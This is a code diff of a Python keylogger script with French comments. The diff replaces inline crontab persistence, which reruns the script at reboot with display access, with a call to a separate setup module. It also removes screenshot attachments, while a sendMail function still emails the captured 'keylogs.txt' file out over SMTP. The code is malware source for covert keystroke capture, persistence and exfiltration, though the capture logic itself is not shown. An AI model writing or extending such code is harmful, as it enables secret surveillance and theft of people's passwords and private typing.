@@ -6,33 +6,14 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
-import subprocess
 import PIL.ImageGrab
 import time
-import os
+from TacheProgrammees import setupCron
 
 
 #--------DÉBUT TÂCHES PROGRAMMÉES---------------
 
-# Chemin vers le script Python
-python_script = os.getcwd()+'/keylogger'
-
-path_env = '../'
-
-# Commande crontab pour exécuter le script Python au démarrage avec temporisation et affichage graphique
-cron_job = f"@reboot sleep 30 && DISPLAY=:0 {path_env} {python_script} >> /home/ubuntu/cronlog.txt 2>&1"
-
-# Obtenir la crontab actuelle de l'utilisateur
-current_cron = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
-
-# Vérifier si le script est déjà dans la crontab
-if cron_job not in current_cron.stdout:
-    # Ajouter la nouvelle tâche à crontab
-    new_cron = current_cron.stdout + cron_job + "\n"
-    subprocess.run(['crontab', '-'], input=new_cron, text=True)
-    print("Le script Python a été ajouté à crontab pour être exécuté au démarrage.")
-else:
-    print("Le script Python est déjà dans crontab.")
+setupCron.setupCron()
 
 #--------FIN TÂCHES PROGRAMMÉES----------------
 
@@ -58,7 +39,6 @@ def sendMail():
     message.attach(MIMEText(corps, "plain"))
 
     filename = "keylogs.txt"
-    filename2 = "screen.png"
 
     try:
         with open(filename, "rb") as attachment:
@@ -70,20 +50,6 @@ def sendMail():
             f"attachment; filename= {filename}",
         )
         message.attach(part)
-
-    except FileNotFoundError:
-        return
-
-    try:
-        with open(filename2, "rb") as attachment:
-            part2 = MIMEBase("application", "octet-stream")
-            part2.set_payload(attachment.read())
-        encoders.encode_base64(part2)
-        part2.add_header(
-        "Content-Disposition",
-        f"attachment; filename= {filename2}",
-        )
-        message.attach(part2)
 
         context = ssl.create_default_context()
 
